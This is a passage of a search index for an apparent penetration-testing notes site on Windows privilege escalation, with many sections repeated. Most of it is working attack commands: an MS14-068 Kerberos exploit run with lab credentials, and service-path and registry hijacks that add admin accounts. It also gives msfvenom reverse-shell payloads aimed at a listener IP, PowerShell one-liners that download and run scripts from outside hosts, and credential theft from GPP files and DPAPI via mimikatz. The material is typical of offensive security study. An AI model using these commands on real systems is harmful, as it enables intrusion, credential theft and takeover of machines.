https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-058 - exploit / windows / local / ms14_058_track_popup_menu References: - https://www.crowdstrike.com/blog/crowdstrike-discovers-use-64-bit-zero-day-privilege-escalation-exploit-cve-2014-4113-hurricane-panda/ - https://www.freebuf.com/articles/system/50110.html","title":"MS14-058 - TrackPopupMenu Win32k NULL Pointer Dereference"},{"location":"windows/windows-issues/#ms14-070-tcpipsetaddroptions-null-pointer-dereference","text":"2003 SP2 Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070 - exploit / windows / local / ms14_070_tcpip_ioctl References: - https://blog.korelogic.com/blog/2015/01/28/2k3_tcpip_setaddroptions_exploit_dev - https://korelogic.com/Resources/Advisories/KL-001-2015-001.txt","title":"MS14-070 - tcpip!SetAddrOptions NULL Pointer Dereference"},{"location":"windows/windows-issues/#bypassuac_eventvwr","text":"","title":"bypassuac_eventvwr"},{"location":"windows/windows-issues/#ms10-015-kitrap0d","text":"","title":"MS10-015 - Kitrap0d"},{"location":"windows/windows-issues/#ms14-068-kerberos-domain-privilege-escalation","text":"Exploits: - Python Kerberos Exploitation Kit - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek - The Mystery of Duqu 2.0: a sophisticated cyberespionage actor returns apt - get install krb5 - user cifs - utils rdate # Add proper nameservers in / etc / hosts / etc / krb5 . conf [ libdefaults ] default_realm = HTB . LOCAL # The following krb5 . conf variables are only for MIT Kerberos . kdc_timesync = 1 ccache_type = 4 forwardable = true proxiable = true # Edit the realms entry as follows : [ realms ] LAB . LOCAL = { kdc = mantis . htb . local : 88 admin_server = mantis . htb . local default_domain = HTB . LOCAL } # Also edit the final section : [ domain_realm ] . domain . internal = HTB . LOCAL domain . internal = HTB . LOCAL net time - S 10 . 10 . 10 . 52 - U # Set local time accordingly # OR USE rdate - n 10 . 10 . 10 . 52 python ms14 - 068. py - u james @htb . local - d mantis . htb . local - p J @m3s_P@ssW0rd ! - s S - 1 - 5 - 21 - 4220043660 - 4019079961 - 2895681657 Rename the generated ticket to \u200b / tmp / krb5cc_0 \u200b mv TGT_James @HTB . local . ccache / tmp / krb5cc_0 With Impacket (Golden PAC module): - kinit james (options ?) - klist (options ?) - python goldenPac . py htb . local / james @mantis . htb . local \u200b - Entering the password for the \u200b james \u200b user Manually: smbclient - W HTB . LOCAL // MANTIS / c $ - k References: - Additional information about CVE-2014-6324 - Attack Methods for Gaining Domain Admin Rights in Active Directory - HTB - Mantis","title":"MS14-068 - Kerberos Domain Privilege Escalation"},{"location":"windows/windows-issues/#cve-2017-0213-com-aggregate-marshaleriremunknown2-type-confusion-privilege-escalation","text":"10, 7, 8.1, 2008, 2008 R2, 2012, 2012 R2, 2016 When accessing an OOP COM object using IRemUnknown2 the local unmarshaled proxy can be for a different interface to that requested by QueryInterface resulting in a type confusion which can result in EoP. Exploit: - https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213 References: - https://bugs.chromium.org/p/project-zero/issues/detail?id=1107 - https://www.exploit-db.com/exploits/42020","title":"CVE-2017-0213 - COM Aggregate Marshaler/IRemUnknown2 Type Confusion Privilege Escalation"},{"location":"windows/windows-issues/#ms11-013","text":"","title":"MS11-013"},{"location":"windows/windows-issues/#juicy-potato","text":"Need SeImpersonate or SeAssignPrimaryToken ( whoami / priv ) https://github.com/ohpe/juicy-potato https://github.com/TsukiCTF/Lovely-Potato http://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter/ Internals: Rotten Potato \u2013 Privilege Escalation from Service Accounts to SYSTEM: https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/","title":"Juicy Potato"},{"location":"windows/windows-privilege-escalation/","text":"Windows Privilege Escalation Options Missing Patches Automated Deployment and Auto Logon Passwords AlwaysInstallElevated (any user can run MSI as SYSTEM) Misconfigured Services DLL Hijacking Token Impersonation Guides https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Flow%20Charts/Privilege%20Escalation/windows.md https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/Windows/windows-services.md https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ Windows Privilege Escalation Fundamentals: http://www.fuzzysecurity.com/tutorials/16.html Tools https://github.com/pentestmonkey/windows-privesc-check/raw/master/windows-privesc-check2.exe BeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Windows Windows-Exploit-Suggester - https://github.com/GDSSecurity/Windows-Exploit-Suggester Check Insecure Services: https://gist.github.com/wdormann/db533d84df57a70e9580a6a2127e33bb Metasploit In 32bit systems: local_exploit_suggester In 64bit systems: search exploit/windows/local Techniques Service Unquoted Path exploit / windows / local / trusted_service_path wmic service get name,displayname,pathname,startmode | findstr /i Auto | findstr /i /v C:\\Windows\\\\ | findstr /i /v C : \\Program Files (x86)\\Program Folder\\A Subfolder\\Executable.exe Leads to running: C : \\Program.exe C : \\Program Files.exe C : \\Program Files (x86)\\Program.exe C : \\Program Files (x86)\\Program Folder\\A.exe C : \\Program Files (x86)\\Program Folder\\A Subfolder\\Executable.exe Insecure Setup: C : \\Program Files (x86) icacls C:\\Program Files (x86)\\Program Folder /grant Everyone:(OI)(CI)F /T F = Full Control CI = Container Inherit \u2013 This flag indicates that subordinate containers will inherit this ACE. OI = Object Inherit \u2013 This flag indicates that subordinate files will inherit the ACE. sc stop Vulnerable Service sc start Vulnerable Service OR shutdown / r / t 0 Need to migrate (auto-migration) Folder Service Executable Privileges When new folders are created in the root it is writeable for all authenticated users by default. (NT AUTHORITY\\Authenticated Users:(I)(M)) So any application that gets installed on the root can be tampered with by a non-admin user. - If binaries load with SYSTEM privileges from this folder it might just be a matter of replacing the binary with your own one. https://msdn.microsoft.com/en-us/library/bb727008.aspx If folder is writable, drop a exe and use \"Service Unquoted Path\" to execute: icacls C:\\Program Files (x86)\\Program Folder If service exe is writable to everyone, low privilege user can replace the exe with some other binary: icacls example.exe F = Full Control CI = Container Inherit - This flag indicates that subordinate containers will inherit this ACE . OI = Object Inherit - This flag indicates that subordinate files will inherit the ACE . accesschk.exe -dqv C:\\ /accepteula Insecure Service Permissions exploit / windows / local / service_permissions Approach 1 - Check permissions of service subinacl.exe /keyreg HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Vulnerable Service /display If service is editable, change the ImagePath to another exe. reg add HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Vulnerable Service /t REG_EXPAND_SZ /v ImagePath /d C:\\Users\\testuser\\AppData\\Local\\Temp\\Payload.exe /f or create a local admin with: sc config Vulnerable Service binpath= net user eviladmin P4ssw0rd@ /add sc config Vulnerable Service binpath= net localgroup Administrators eviladmin /add Approach 2 - Check services a given user can edit accesschk.exe -uwcqv testuser * accesschk.exe -uwcqv Authenticated Users * /accepteula accesschk.exe -uwcqv * /accepteula sc config upnphost binpath= net user /add amxuser1 amxpass1234 sc config upnphost obj= .\\LocalSystem password= sc qc upnphost net stop upnphost net start upnphost net start upnphost sc config upnphost binpath= net localgroup administrators amxuser1 /add sc config upnphost obj= .\\LocalSystem password= sc qc upnphost net stop upnphost net start upnphost net start upnphost sc config upnphost binpath= net localgroup \\ Remote Desktop Users\\ amxuser1 /add sc config upnphost obj= .\\LocalSystem password= sc qc upnphost net stop upnphost net start upnphost net start upnphost AlwaysInstallElevated exploit / windows / local / always_install_elevated [HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] AlwaysInstallElevated =dword:00000001 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] AlwaysInstallElevated =dword:00000001 reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated Installing MSI: msiexec /quiet /qn /i malicious.msi Payload Generation: msfvenom -f msi-nouac -p windows/adduser USER=eviladmin PASS=P4ssw0rd@ -o add_user.msi msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe msfvenom -f msi-nouac -p windows/exec cmd= C:\\Users\\testuser\\AppData\\Local\\Temp\\Payload.exe malicious.msi Task Scheduler On Windows 2000, XP, and 2003 machines, scheduled tasks run as SYSTEM privileges. Works only on Windows 2000, XP, or 2003 Must have local administrator net start Task Scheduler time at 06 : 42 / interactive C:\\Documents and Settings\\test\\Local Settings\\Temp\\Payload.exe DLL Hijacking (DLL preloading attack or a binary planting attack) https://github.com/Arvanaghi/Windows-DLL-Injector https://securityxploded.com/remote-dll-injector.php https://pentestlab.blog/2017/04/04/dll-injection/ https://msdn.microsoft.com/en-us/library/windows/desktop/ff919712(v=vs.85).aspx Search order: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx When an application dynamically loads a dynamic - link library without specifying a fully qualified path name , Windows attempts to locate the DLL by searching a well - defined set of directories in a particular order , as described in Dynamic - Link Library Search Order . The directory from which the application loaded 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) The current working directory ( CWD ) Directories in the PATH environment variable ( system then user ) Services running under SYSTEM does not search through user path environment. Example: #include stdafx.h #include windows.h void _tmain ( int argc , _TCHAR * argv []) { LoadLibrary ( L hijackable.dll ); } Identify processes / services - Use procman ( https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx ). - Filter Result = NAME NOT FOUND and Path ends with dll - Look at the registry key ServiceDll of services ( Parameters ). msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.2.60 lport=8989 -f dll hijackable.dll Windows 7 IKE and AuthIP IPsec Keying Modules ( IKEEXT ) \u2013 wlbsctrl . dll Windows Media Center Receiver Service ( ehRecvr ) \u2013 ehETW . dll Windows Media Center Scheduler Service ( ehSched ) \u2013 ehETW . dll Can run Media Center services over command line: schtasks.exe /run /I /TN \u201c\\Microsoft\\Windows\\Media Center\\mcupdate\u201d schtasks.exe /run /I /TN \u201c\\Microsoft\\Windows\\Media Center\\MediaCenterRecoveryTask\u201d schtasks.exe /run /I /TN \u201c\\Microsoft\\Windows\\Media Center\\ActivateWindowsSearch\u201d Windows XP Automatic Updates ( wuauserv ) \u2013 ifsproxy . dll Remote Desktop Help Session Manager ( RDSessMgr ) \u2013 SalemHook . dll Remote Access Connection Manager ( RasMan ) \u2013 ipbootp . dll Windows Management Instrumentation ( winmgmt ) \u2013 wbemcore . dll Audio Service ( STacSV ) \u2013 SFFXComm . dll SFCOM . DLL Intel ( R ) Rapid Storage Technology ( IAStorDataMgrSvc ) \u2013 DriverSim . dll Juniper Unified Network Service ( JuniperAccessService ) \u2013 dsLogService . dll Encase Enterprise Agent \u2013 SDDisk . dll Migrations CWDIllegalInDllSearch Allow user to change DLL search path algorithm [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager] CWDIllegalInDllSearch 1, 2 or ffffffff ? The directory from which the application loaded 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) [ dlls not loaded ] The current working directory ( CWD ) Directories in the PATH environment variable ( system then user ) SetDllDirectory Removes the current working directory (CWD) from the search order SetDllDirectory(\u201cC:\\program files\\MyApp\\\u201d) : The directory from which the application loaded [ added ] C :\\ program files \\ MyApp \\ 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) [ removed ] The current working directory ( CWD ) Directories in the PATH environment variable ( system then user ) SetDllDirectory(\"\") The directory from which the application loaded 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) [ removed ] The current working directory ( CWD ) Directories in the PATH environment variable ( system then user ) SafeDllSearchMode Enabled by default Can disable using [ HKEY_LOCAL_MACHINE \\ SYSTEM \\ CurrentControlSet \\ Control \\ Session Manager ] Calling the SetDllDirectory(\u201c\u201d) or SetDllDirectory(\u201cC:\\program files\\MyApp\\\u201d) disables SafeDllSearchMode and uses the search order described for SetDllDirectory. DEV LoadLibraryEx (additional argument) SetEnvironmentVariable(TEXT(\u201cPATH\u201d),NULL) Change default installation folder to C:\\Program Files Fully qualified path when loading DLLs Use SetDllDirectory(\u201c\u201d) API removing the current working directory from the search order If software needs to be installed on the root check there are no binaries needing SYSTEM privileges If SYSTEM privileges are required then change the ACL\u2019s of the folder Remove the path entry from the SYSTEM path variable if not needed When enabled The directory from which the application loaded 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) The current working directory ( CWD ) Directories in the PATH environment variable ( system then user ) When disabled The directory from which the application loaded [ moved up the list ] The current working directory ( CWD ) 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) Directories in the PATH environment variable ( system then user ) Stored Credentials C : \\ unattend . xml C : \\ sysprep . inf C : \\ sysprep \\ sysprep . xml dir c : \\ * vnc . ini / s / b / c dir c : \\ * ultravnc . ini / s / b / c dir c : \\ / s / b / c | findstr / si * vnc . ini findstr / si password * . txt | * . xml | * . ini findstr / si pass * . txt | * . xml | * . ini Unattended Installations post / windows / gather / enum_unattend Look for UserAccounts tag of Unattend . xml , sysprep . xml and sysprep . inf across the system, including: C : \\ Windows \\ Panther \\ C : \\ Windows \\ Panther \\ Unattend \\ C : \\ Windows \\ System32 \\ C : \\ Windows \\ System32 \\ sysprep \\ Microsoft appends \"Password\" to all passwords within Unattend files before encoding them. Group Policy Preferences (GPP) Introduced from Windows Server 2008 https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati GPP allows for configuration of Domain-attached machines via group policy . Map drives (Drives.xml) Create Local Users Data Sources (DataSources.xml) Printer configuration (Printers.xml) Create/Update Services (Services.xml) Scheduled Tasks (ScheduledTasks.xml) Change local Administrator passwords GPPs are stored in the SYSVOL share, which is world-readable to authenticated users. \\\\ DOMAIN \\ SYSVOL \\ DOMAIN \\ Policies \\ findstr / S / I cpassword \\\\ FQDN \\ sysvol \\ FQDN \\ policies \\ * . xml Domain machines periodically reach out and authenticate to the Domain Controller utilizing the Domain credentials of the logged - in user and pull down policies. Group Policies for account management are stored on the Domain Controller in Groups . xml files buried in the SYSVOL folder ( \\\\ Domain \\ SYSVOL \\ DOMAIN \\ Policies ) cpassword is used to set passwords for the Local Administrator account. Password is AES-256 encrypted using a published key: https://msdn.microsoft.com/en-us/library/Cc422924.aspx Metasploit: post / windows / gather / credentials / gpp PowerSploit: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1 Get-CachedGPPPassword //For locally stored GP Files Get-GPPPassword //For GP Files stored in the DC Get - DecryptedPassword to decrypt the AES encryption http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip https://pentestlab.blog/tag/cpassword/ Decrypt encrypted password: gpp - decrypt $ cpassword Get - GPPPassword Get - NetOU - GUID {4C86DD57-4040-41CD-B163-58F208A26623} | % { Get - NetComputer - ADSPath $ _ } // All OUs connected to policy | List all domain machines tied to OU IEX ( New - Object Net . WebClient ). DownloadString ( http://192.168.100.3/tmp/PowerUp.ps1 ) IEX ( New - Object Net . WebClient ). DownloadString ( http://192.168.100.3/tmp/PowerView.ps1 ) Get - CachedGPPPassword Future - Local Administrator Password Solution (LAPS): https://www.microsoft.com/en-us/download/details.aspx?id=46899 Defense Prevent passwords from getting added to GPP (KB2962486) and delete existing GPP from SYSVOL containing passwords. [ALERTING] Detect by setting Everyone:DENY on SYSVOL GPP file. (Logs: Audit access denied) Token Impersonation PowerSploit / Incognito List all tokens Invoke - TokenManipulation - ShowAll List all unique and usable tokens Invoke - TokenManipulation - Enumerate Start new process with token of a user Invoke - TokenManipulation - ImpersonateUser - Username domain\\user Start new process with token of another process Invoke - TokenManipulation - CreateProcess C:\\Windown\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe - ProcessId 500 cmdkey Creates, lists, and deletes stored user names and passwords or credentials. Usable with \"runas /savecred\" cmdkey / list Run a command as admin: runas / user : ACCESS \\ Administrator / savecred \u200b powershell - c IEX ( New - Object Net . Webclient ). downloadstring ( http://10.10.14.2/admin.ps1 ) powershell . exe - Credential TestDomain\\Me - NoNewWindow - ArgumentList Start-Process powershell.exe -Verb runAs Find all runas shortcuts: Get - ChildItem \u200b \u200b C:\\ \u200b * . lnk - Recurse - Force | ft fullname | \u200b Out - File \u200b shortcuts . txt ForEach \u200b ( \u200b $ file \u200b \u200b in \u200b gc . \\ shortcuts . txt ) { \u200b Write - Output \u200b \u200b $ file \u200b ; gc \u200b $ file \u200b | Select - String \u200b runas } Windows Data Protection API Locating credential files cmd\u200b /c \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Vault \u200b dir\u200b /S /AS C : \\Users\\security\\AppData\\Local\\Microsoft\\Credentials \u200b dir\u200b /S /AS C : \\Users\\security\\AppData\\Local\\Microsoft\\Protect \u200b dir\u200b /S /AS C : \\Users\\security\\AppData\\Roaming\\Microsoft\\Vault \u200b dir\u200b /S /AS C : \\Users\\security\\AppData\\Roaming\\Microsoft\\Credentials \u200b dir\u200b /S /AS C : \\Users\\security\\AppData\\Roaming\\Microsoft\\Protect Transfer [Convert]::ToBase64String([IO.File]::ReadAllBytes(\u200b C:\\Users\\security\\AppData\\Roamin g\\Microsoft\\Credentials\\51AB168BE4BDB3A603DADE4F8CA81290 \u200b )) [IO.File]::WriteAllBytes(\u200b 51AB168BE4BDB3A603DADE4F8CA81290 \u200b , [Convert]::FromBase64String(\u200b AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6 VI40+LQ9k9ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAI ABEAGEAdABhAA0ACgAAABBmAAAAAQAAIAAAAPW7usJAvZDZr308LPt/MB8fEjrJTQejzAEgOBNfpaa8AAAA AA6AAAAAAgAAIAAAAPlkLTI/rjZqT3KT0C8m5Ecq3DKwC6xqBhkURY2t/T5SAAEAAOc1Qv9x0IUp+dpf+I7 c1b5E0RycAsRf39nuWlMWKMsPno3CIetbTYOoV6/xNHMTHJJ1JyF/4XfgjWOmPrXOU0FXazMzKAbgYjY+WH hvt1Uaqi4GdrjjlX9Dzx8Rou0UnEMRBOX5PyA2SRbfJaAWjt4jeIvZ1xGSzbZhxcVobtJWyGkQV/5v4qKxd lugl57pFAwBAhDuqBrACDD3TDWhlqwfRr1p16hsqC2hX5u88cQMu+QdWNSokkr96X4qmabp8zopfvJQhAHC KaRRuRHpRpuhfXEojcbDfuJsZezIrM1LWzwMLM/K5rCnY4Sg4nxO23oOzs4q/ZiJJSME21dnu8NAAAAAY/z BU7zWC+/QdKUJjqDlUviAlWLFU5hbqocgqCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJvEgzQvv2cbicmQ == \u200b )) Extraction credential file - masterkey (guidMasterKey) - https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials dpapi::\u200b cred\u200b /\u200b in\u200b :51\u200b AB168BE4BDB3A603DADE4F8CA81290 /\u200b sid:S\u200b -1-5-21-953262931-566350628-63446256-1001 /\u200b password\u200b :4\u200b Cc3ssC0ntr0ller Examine master key file dpapi::\u200b masterkey\u200b /\u200b in\u200b :0792\u200b c32e\u200b -48\u200b a5\u200b -4\u200b fe3\u200b -8\u200b b43\u200b - \u200b d93d64590580 /\u200b sid:S\u200b -1-5-21-953262931-566350628-63446256-1001 /\u200b password\u200b :4\u200b Cc3ssC0ntr0ller Decrypt credential blob dpapi::\u200b cred\u200b /\u200b in\u200b :51\u200b AB168BE4BDB3A603DADE4F8CA81290 Using Kernel Exploit Installed updates: wmic qfe get Caption,Description,HotFixID,InstalledOn KiTrap0d Using logical flaws Other Directory Replication Service (DRSR) Netlogon Remote Service (NRPC) BackupKey Remote Service (BKRP) Local Service Authority (Domain Policy) Remote Protocol (LSAD) Privilege Attribute Certificate Data Structure (PAC) Kerberos Kerberos Protocol Extension (KILE) Kerberos Protocol Extension, Service for User and Constrained Delegation Protocol (SFU) Add user using service misconfiguration PowerUp Perform all checks: Invoke - AllChecks Services with unquoted paths and a space in their name: Get - ServiceUnquoted - Verbose Service binary in a location writable to current user (Replace the binary to gain code execution): Get - ModifiableServiceFile - Verbose Service can be modified by current user: Get - ModifiableService - Verbose References https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ http://www.greyhathacker.net/?p=738 https://toshellandback.com/2015/11/24/ms-priv-esc https://www.toshellandback.com/2015/08/30/gpp/","title":"Windows Privilege Escalation"},{"location":"windows/windows-privilege-escalation/#windows-privilege-escalation","text":"","title":"Windows Privilege Escalation"},{"location":"windows/windows-privilege-escalation/#options","text":"Missing Patches Automated Deployment and Auto Logon Passwords AlwaysInstallElevated (any user can run MSI as SYSTEM) Misconfigured Services DLL Hijacking Token Impersonation","title":"Options"},{"location":"windows/windows-privilege-escalation/#guides","text":"https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Flow%20Charts/Privilege%20Escalation/windows.md https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/Windows/windows-services.md https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ Windows Privilege Escalation Fundamentals: http://www.fuzzysecurity.com/tutorials/16.html","title":"Guides"},{"location":"windows/windows-privilege-escalation/#tools","text":"https://github.com/pentestmonkey/windows-privesc-check/raw/master/windows-privesc-check2.exe BeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Windows Windows-Exploit-Suggester - https://github.com/GDSSecurity/Windows-Exploit-Suggester Check Insecure Services: https://gist.github.com/wdormann/db533d84df57a70e9580a6a2127e33bb","title":"Tools"},{"location":"windows/windows-privilege-escalation/#metasploit","text":"In 32bit systems: local_exploit_suggester In 64bit systems: search exploit/windows/local","title":"Metasploit"},{"location":"windows/windows-privilege-escalation/#techniques","text":"","title":"Techniques"},{"location":"windows/windows-privilege-escalation/#service-unquoted-path","text":"exploit / windows / local / trusted_service_path wmic service get name,displayname,pathname,startmode | findstr /i Auto | findstr /i /v C:\\Windows\\\\ | findstr /i /v C : \\Program Files (x86)\\Program Folder\\A Subfolder\\Executable.exe Leads to running: C : \\Program.exe C : \\Program Files.exe C : \\Program Files (x86)\\Program.exe C : \\Program Files (x86)\\Program Folder\\A.exe C : \\Program Files (x86)\\Program Folder\\A Subfolder\\Executable.exe Insecure Setup: C : \\Program Files (x86) icacls C:\\Program Files (x86)\\Program Folder /grant Everyone:(OI)(CI)F /T F = Full Control CI = Container Inherit \u2013 This flag indicates that subordinate containers will inherit this ACE. OI = Object Inherit \u2013 This flag indicates that subordinate files will inherit the ACE. sc stop Vulnerable Service sc start Vulnerable Service OR shutdown / r / t 0 Need to migrate (auto-migration)","title":"Service Unquoted Path"},{"location":"windows/windows-privilege-escalation/#folder-service-executable-privileges","text":"When new folders are created in the root it is writeable for all authenticated users by default. (NT AUTHORITY\\Authenticated Users:(I)(M)) So any application that gets installed on the root can be tampered with by a non-admin user. - If binaries load with SYSTEM privileges from this folder it might just be a matter of replacing the binary with your own one. https://msdn.microsoft.com/en-us/library/bb727008.aspx If folder is writable, drop a exe and use \"Service Unquoted Path\" to execute: icacls C:\\Program Files (x86)\\Program Folder If service exe is writable to everyone, low privilege user can replace the exe with some other binary: icacls example.exe F = Full Control CI = Container Inherit - This flag indicates that subordinate containers will inherit this ACE . OI = Object Inherit - This flag indicates that subordinate files will inherit the ACE . accesschk.exe -dqv C:\\ /accepteula","title":"Folder &amp; Service Executable Privileges"},{"location":"windows/windows-privilege-escalation/#insecure-service-permissions","text":"exploit / windows / local / service_permissions","title":"Insecure Service Permissions"},{"location":"windows/windows-privilege-escalation/#approach-1-check-permissions-of-service","text":"subinacl.exe /keyreg HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Vulnerable Service /display If service is editable, change the ImagePath to another exe. reg add HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Vulnerable Service /t REG_EXPAND_SZ /v ImagePath /d C:\\Users\\testuser\\AppData\\Local\\Temp\\Payload.exe /f or create a local admin with: sc config Vulnerable Service binpath= net user eviladmin P4ssw0rd@ /add sc config Vulnerable Service binpath= net localgroup Administrators eviladmin /add","title":"Approach 1 - Check permissions of service"},{"location":"windows/windows-privilege-escalation/#approach-2-check-services-a-given-user-can-edit","text":"accesschk.exe -uwcqv testuser * accesschk.exe -uwcqv Authenticated Users * /accepteula accesschk.exe -uwcqv * /accepteula sc config upnphost binpath= net user /add amxuser1 amxpass1234 sc config upnphost obj= .\\LocalSystem password= sc qc upnphost net stop upnphost net start upnphost net start upnphost sc config upnphost binpath= net localgroup administrators amxuser1 /add sc config upnphost obj= .\\LocalSystem password= sc qc upnphost net stop upnphost net start upnphost net start upnphost sc config upnphost binpath= net localgroup \\ Remote Desktop Users\\ amxuser1 /add sc config upnphost obj= .\\LocalSystem password= sc qc upnphost net stop upnphost net start upnphost net start upnphost","title":"Approach 2 - Check services a given user can edit"},{"location":"windows/windows-privilege-escalation/#alwaysinstallelevated","text":"exploit / windows / local / always_install_elevated [HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] AlwaysInstallElevated =dword:00000001 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] AlwaysInstallElevated =dword:00000001 reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated Installing MSI: msiexec /quiet /qn /i malicious.msi Payload Generation: msfvenom -f msi-nouac -p windows/adduser USER=eviladmin PASS=P4ssw0rd@ -o add_user.msi msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe msfvenom -f msi-nouac -p windows/exec cmd= C:\\Users\\testuser\\AppData\\Local\\Temp\\Payload.exe malicious.msi","title":"AlwaysInstallElevated"},{"location":"windows/windows-privilege-escalation/#task-scheduler","text":"On Windows 2000, XP, and 2003 machines, scheduled tasks run as SYSTEM privileges. Works only on Windows 2000, XP, or 2003 Must have local administrator net start Task Scheduler time at 06 : 42 / interactive C:\\Documents and Settings\\test\\Local Settings\\Temp\\Payload.exe","title":"Task Scheduler"},{"location":"windows/windows-privilege-escalation/#dll-hijacking-dll-preloading-attack-or-a-binary-planting-attack","text":"https://github.com/Arvanaghi/Windows-DLL-Injector https://securityxploded.com/remote-dll-injector.php https://pentestlab.blog/2017/04/04/dll-injection/ https://msdn.microsoft.com/en-us/library/windows/desktop/ff919712(v=vs.85).aspx Search order: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx When an application dynamically loads a dynamic - link library without specifying a fully qualified path name , Windows attempts to locate the DLL by searching a well - defined set of directories in a particular order , as described in Dynamic - Link Library Search Order . The directory from which the application loaded 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) The current working directory ( CWD ) Directories in the PATH environment variable ( system then user ) Services running under SYSTEM does not search through user path environment. Example: #include stdafx.h #include windows.h void _tmain ( int argc , _TCHAR * argv []) { LoadLibrary ( L hijackable.dll ); } Identify processes / services - Use procman ( https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx ). - Filter Result = NAME NOT FOUND and Path ends with dll - Look at the registry key ServiceDll of services ( Parameters ). msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.2.60 lport=8989 -f dll hijackable.dll","title":"DLL Hijacking (DLL preloading attack or a binary planting attack)"},{"location":"windows/windows-privilege-escalation/#windows-7","text":"IKE and AuthIP IPsec Keying Modules ( IKEEXT ) \u2013 wlbsctrl . dll Windows Media Center Receiver Service ( ehRecvr ) \u2013 ehETW . dll Windows Media Center Scheduler Service ( ehSched ) \u2013 ehETW . dll Can run Media Center services over command line: schtasks.exe /run /I /TN \u201c\\Microsoft\\Windows\\Media Center\\mcupdate\u201d schtasks.exe /run /I /TN \u201c\\Microsoft\\Windows\\Media Center\\MediaCenterRecoveryTask\u201d schtasks.exe /run /I /TN \u201c\\Microsoft\\Windows\\Media Center\\ActivateWindowsSearch\u201d","title":"Windows 7"},{"location":"windows/windows-privilege-escalation/#windows-xp","text":"Automatic Updates ( wuauserv ) \u2013 ifsproxy . dll Remote Desktop Help Session Manager ( RDSessMgr ) \u2013 SalemHook . dll Remote Access Connection Manager ( RasMan ) \u2013 ipbootp . dll Windows Management Instrumentation ( winmgmt ) \u2013 wbemcore . dll Audio Service ( STacSV ) \u2013 SFFXComm . dll SFCOM . DLL Intel ( R ) Rapid Storage Technology ( IAStorDataMgrSvc ) \u2013 DriverSim . dll Juniper Unified Network Service ( JuniperAccessService ) \u2013 dsLogService . dll Encase Enterprise Agent \u2013 SDDisk . dll","title":"Windows XP"},{"location":"windows/windows-privilege-escalation/#migrations","text":"","title":"Migrations"},{"location":"windows/windows-privilege-escalation/#cwdillegalindllsearch","text":"Allow user to change DLL search path algorithm [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager] CWDIllegalInDllSearch 